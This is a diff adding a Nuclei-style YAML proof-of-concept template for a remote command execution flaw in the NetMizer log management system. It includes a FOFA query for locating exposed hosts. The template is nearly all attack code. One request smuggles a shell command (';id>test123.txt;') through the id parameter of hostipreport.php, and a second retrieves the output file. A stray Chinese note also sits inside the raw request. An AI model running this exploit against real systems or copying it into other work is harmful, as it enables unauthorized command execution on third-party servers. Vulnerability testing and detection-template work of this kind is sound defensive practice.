@@ -1,0 +1,50 @@
+id: poc-lu9mtfmgxr54gl8z
+info:
+  name: NetMizer 日志审计 hostipreport.php 存在rce漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/lu9mtfmgxr54gl8z'
+  tags: rce,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: lu9mtfmgxr54gl8z
+    fofa: title="NetMizer 日志管理系统"
+http:
+- raw:
+  - 'GET /data/yxproject/hostipreport.php?action=showtask&id=;id>test123.txt; HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Moziilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
+
+    Accept-Encoding: gzip, deflate, br
+
+    Connection: keep-alive
+
+    访问得到结果'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
+- raw:
+  - 'GET /data/yxproject/test123.txt HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36
+
+    Connection: close
+
+    Cache-Control: no-cache
+
+    Pragma: no-cache
+
+    Upgrade-Insecure-Requests: 1
+
+    Accept-Encoding: gzip'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
